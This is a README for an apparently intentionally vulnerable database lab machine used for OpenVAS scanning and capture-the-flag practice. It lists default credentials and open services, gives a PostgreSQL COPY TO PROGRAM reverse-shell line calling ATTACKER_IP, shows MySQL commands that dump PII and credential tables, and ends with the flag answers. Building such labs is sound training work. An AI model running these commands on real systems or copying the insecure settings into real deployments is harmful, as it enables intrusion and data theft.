# 🏢 VulnCorp — Machine 4: rz-db01 (Database Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Deploy target: **192.168.10.101**. The compose file publishes every port on `0.0.0.0`, so no IP edit is required.

Services OpenVAS can match on this host:

| CVE | Service | Port | Version the check matches |
| --- | --- | --- | --- |
| CVE-2019-9193 | PostgreSQL | 5432 | **11.2** (range 9.3–11.2) |
| CVE-2024-31449 | Redis | 6379 | **7.2.5** (range 7.2.0–7.2.5) |

MySQL and SSH are the Ubuntu image. PostgreSQL and Redis are separate pinned images. Copy `.env.example` to `.env` and set the passwords there before `docker compose up`. SSH is published on host port **2222**.

---

## Deploy on 192.168.10.101

Copy `machines/rz-db01` to the host as `/opt/rz-db01`. The lab hosts so far are Ubuntu 24.04. Install Docker with `sudo`, then start the stack.

```bash
sudo apt-get update
sudo apt-get install -y ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu noble stable" | sudo tee /etc/apt/sources.list.d/docker.list
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo systemctl enable --now docker

cd /opt/rz-db01
cp .env.example .env
# edit .env, then:
sudo docker compose up -d --build
sudo docker compose ps
```

If an older PostgreSQL container is already bound to port 5432, remove it before the compose start. Ubuntu’s own PostgreSQL 16 package will not match CVE-2019-9193.

## Verify

```bash
sudo docker inspect -f '{{.State.Health.Status}}' vulncorp-postgres vulncorp-redis
sudo docker exec vulncorp-postgres psql -U vulncorp_user -d vulncorp_prod -c 'select version();'
sudo docker exec vulncorp-redis redis-cli INFO server | head
```

Expected banners: PostgreSQL **11.2** and `redis_version:7.2.5`. Scan **192.168.10.101** ports **5432** and **6379** with OpenVAS **Full and fast** and an updated Community feed.

---

## 📡 Exposed Ports & Services

| Service | Port | Vulnerability |
|---------|------|---------------|
| **MySQL** | `3306` | Default root credentials (`root` / `toor`), bound to `0.0.0.0`, PII stored in plaintext |
| **PostgreSQL** | `5432` | Upstream **11.2**, superuser `vulncorp_user` / `vulncorp123`. Last build in the CVE-2019-9193 range OpenVAS matches (9.3 through 11.2) |
| **Redis** | `6379` | Upstream **7.2.5** (no password, `protected-mode no`). In the CVE-2024-31449 range OpenVAS matches (fixed in 7.2.6) |
| **SSH** | `22` | OpenSSH root login allowed |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. MySQL Data Exfiltration
```bash
mysql -h 172.16.0.10 -u root -ptoor
SHOW DATABASES;
USE vulncorp_prod;
SELECT * FROM employees;               # SSNs, salaries, emails
SELECT * FROM internal_credentials;    # Passwords for DC, ERP, DevOps, Backup
```

### 2. PostgreSQL RCE (COPY TO PROGRAM)
```bash
psql -h 172.16.0.10 -U vulncorp_user -d vulncorp_prod
# Password: vulncorp123
# Execute reverse shell:
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';
```

### 3. Redis CVE-2024-31449

The Redis service is `vulncorp-redis` (`redis:7.2.5`) on **192.168.10.101:6379**. `requirepass` is empty and `protected-mode` is off. OpenVAS matches this banner in the 7.2.0–7.2.5 range (fixed in 7.2.6). CVE-2024-31449 is an authenticated Lua bug, not a crontab write. A default top-1000 port scan can skip 6379, so include that port in the scan.

---

## 🏆 Flags

- **MySQL Default Creds Flag:** `secret_flags` table (`VULN{mysql_d3fault_cr3ds}`)
- **PII Data Flag:** `/tmp/pii_flag.txt` (`VULN{pii_d4t4_3xfil}`)
- **PostgreSQL RCE Flag:** `pg_flag` table (`VULN{pg_rce_4_th3_w1n}`)
- **Root Flag:** `/root/root.txt` (`VULN{db_s3rv3r_r00t3d_m4ch1n3_4}`)
